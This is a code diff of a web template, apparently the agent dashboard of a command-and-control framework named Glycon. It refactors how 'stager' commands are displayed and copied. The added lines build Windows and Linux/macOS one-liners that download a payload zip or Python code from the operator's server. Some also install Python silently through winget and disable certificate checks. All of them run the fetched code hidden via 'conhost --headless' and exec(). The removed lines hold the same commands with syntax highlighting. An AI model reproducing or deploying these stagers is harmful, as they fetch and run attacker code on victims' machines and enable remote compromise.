+            const command1 = `curl ${curlOption} ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c ${pythonCode}`;
+            const command2 = trustedCert
+                ? `winget install --accept-package-agreements --accept-source-agreements --disable-interactivity -s msstore 9NCVDN91XZQP >NUL & start /b conhost --headless pip install requests urllib3 & timeout 10 > NUL& start /b conhost --headless python -c "import requests; url='${url}/a/d'; exec(requests.get(url).text)"`
+                : `winget install --accept-package-agreements --accept-source-agreements --disable-interactivity -s msstore 9NCVDN91XZQP >NUL & start /b conhost --headless pip install requests urllib3 & timeout 10 > NUL& start /b conhost --headless python -c "import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); import requests; url='${url}/a/d'; exec(requests.get(url, verify=False).text)"`;
+            const nixPythonCode = `"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
+            const command3 = `python3 -c ${nixPythonCode}`;
 
-           // Display with syntax highlighting and separate copy buttons
-document.getElementById('displayArea').innerHTML = `
-    <h6>Windows</h6>
-    <div style="position: relative; margin-bottom: 15px; background-color: #1e1e1e; padding: 10px; border-radius: 4px;">
-        <code style="color: #9cdcfe;">curl</code> <code style="color: #ce9178;">${curlOption}</code> <code style="color: #ce9178;">${url}/a/p</code> <code style="color: #ce9178;">-o</code> <code style="color: #ce9178;">c:\\users\\public\\p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">c:\\users\\public</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">tar</code> <code style="color: #ce9178;">-xf</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">del</code> <code style="color: #ce9178;">/q</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">documents</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">python</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">${formatPythonCode(pythonCode)}</code>
-        <button class="copy-btn" data-cmd="${escapeHtml(command)}" style="position: absolute; top: 5px; right: 5px; padding: 2px 8px; font-size: 12px; background: #3a3d41; border: none; color: white; border-radius: 3px; cursor: pointer;">
-            <i class="bi bi-clipboard"></i> Copy
-        </button>
-    </div>
-    <div style="position: relative; margin-bottom: 15px; background-color: #1e1e1e; padding: 10px; border-radius: 4px;">
-        <code style="color: #9cdcfe;">winget</code> <code style="color: #ce9178;">install</code> <code style="color: #ce9178;">--accept-package-agreements --accept-source-agreements --disable-interactivity </code> <code style="color: #ce9178;">-s</code> <code style="color: #ce9178;">msstore</code> <code style="color: #ce9178;">9NCVDN91XZQP</code> <code style="color: #d4d4d4;">></code><code style="color: #ce9178;">NUL</code> <code style="color: #d4d4d4;">&</code> <code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">pip</code> <code style="color: #ce9178;">install</code> <code style="color: #ce9178;">requests urllib3</code> <code style="color: #d4d4d4;">&</code> timeout 10 > NUL<code style="color: #d4d4d4;">&</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless </code> <code style="color: #9cdcfe;">python</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">${formatPythonCode(pythonCode)}</code>
-        <button class="copy-btn" data-cmd="${escapeHtml(command2)}" style="position: absolute; top: 5px; right: 5px; padding: 2px 8px; font-size: 12px; background: #3a3d41; border: none; color: white; border-radius: 3px; cursor: pointer;">
-            <i class="bi bi-clipboard"></i> Copy
-        </button>
-    </div>
-    <h6>Nix</h6>
-    <div style="position: relative; background-color: #1e1e1e; padding: 10px; border-radius: 4px;">
-        <code style="color: #9cdcfe;">python3</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">${formatPythonCode(nixPythonCode)}</code>
-        <button class="copy-btn" data-cmd="${escapeHtml(command3)}" style="position: absolute; top: 5px; right: 5px; padding: 2px 8px; font-size: 12px; background: #3a3d41; border: none; color: white; border-radius: 3px; cursor: pointer;">
-            <i class="bi bi-clipboard"></i> Copy
-        </button>
-    </div>
-    ${killDateDisplay}`;
+            const stagers = [
+                { label: 'Windows (Portable Python Zip Stager)', cmd: command1 },
+                { label: 'Windows (Winget Python Stager)', cmd: command2 },
+                { label: 'Linux / macOS (Python3 One-Liner)', cmd: command3 }
+            ];
 
-// Add copy functionality for both buttons
-document.querySelectorAll('.copy-btn').forEach(btn => {
-    btn.addEventListener('click', function() {
-        const cmd = this.getAttribute('data-cmd');
-        navigator.clipboard.writeText(cmd).then(() => {
-            const originalText = this.innerHTML;
-            this.innerHTML = '<i class="bi bi-check"></i> Copied!';
-            setTimeout(() => {
-                this.innerHTML = originalText;
-            }, 2000);
-        });
-    });
-});
+            const displayArea = document.getElementById('displayArea');
+            displayArea.innerHTML = stagers.map(s => `
+                <div class="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
+                    <div class="flex items-center justify-between">
+                        <span class="text-[11px] font-sans font-semibold uppercase tracking-wider text-slate-400">${GlyconUI.escapeHtml(s.label)}</span>
+                        <button type="button" class="copy-btn tactical-btn-ghost py-1 px-2 text-emerald-400" data-cmd="${GlyconUI.escapeHtml(s.cmd)}">
+                            Copy
+                        </button>
+                    </div>
+                    <pre class="text-xs font-mono text-cyan-300 overflow-x-auto whitespace-pre-wrap break-all select-all">${GlyconUI.escapeHtml(s.cmd)}</pre>
+                </div>
+            `).join('');
 
-// Helper function to escape HTML (needed if commands contain special chars)
-function escapeHtml(unsafe) {
-    return unsafe
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
-}
-        }
-
-        // Helper function to format Python code with syntax highlighting
-        function formatPythonCode(code) {
-            return code
-                .replace(/import/g, '<span style="color: #569cd6;">import</span>')
-                .replace(/exec/g, '<span style="color: #569cd6;">exec</span>')
-                .replace(/False/g, '<span style="color: #569cd6;">False</span>')
-                .replace(/disable_warnings/g, '<span style="color: #dcdcaa;">disable_warnings</span>')
-                .replace(/get/g, '<span style="color: #dcdcaa;">get</span>');
+            displayArea.querySelectorAll('.copy-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const cmd = this.getAttribute('data-cmd');
+                    navigator.clipboard.writeText(cmd).then(() => {
+                        this.textContent = 'Copied!';
+                        GlyconUI.toast('Copied', 'Stager command copied to clipboard', 'success', 2000);
+                        setTimeout(() => { this.textContent = 'Copy'; }, 2000);
+                    });
+                });
+            });
         }
     });
 </script>
-
-<style>
-    .agent-online {
-        background-color: rgba(33, 2, 135, 0.05);
-    }
-
-    
-    .agent-inactive {
-        background-color: rgba(237, 196, 74, 0.245);
-    }
-
-    .agent-offline {
-        background-color: rgba(220, 53, 69, 0.05);
-    }
-    .btn-group {
-        box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075);
-    }
-    .badge {
-        font-weight: 500;
-    }
-    .command-display code {
-        font-family: 'Consolas', 'Monaco', monospace;
-    }
-    .toast {
-        margin-bottom: 0.5rem;
-    }
-
-    .btn-icon {
-    width: 24px;
-    height: 24px;
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    padding: 0;
-    border-radius: 20%;
-    }
-
-    .btn-icon i {
-        font-size: 1rem;
-    }
-
-    /* Hover effects */
-    .btn-icon:hover {
-        transform: translateY(-1px);
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-
-    /* Agent name link styling */
-    #agentsTable a {
-        text-decoration: none;
-        color: var(--bs-body-color);
-        font-weight: 500;
-    }
-
-    #agentsTable a:hover {
-        color: var(--bs-primary);
-        text-decoration: underline;
-    }
-
-    #agentsTable tbody tr {
-    transition: all 0.2s ease;
-}
-
-    #agentsTable tbody tr:hover {
-    background-color: rgba(0, 0, 0, 0.02);
-    transform: translateX(2px);
-}
-
-.d-flex.gap-1 {
-    gap: 0.5rem;
-}
-
-</style>
 {% endblock %}
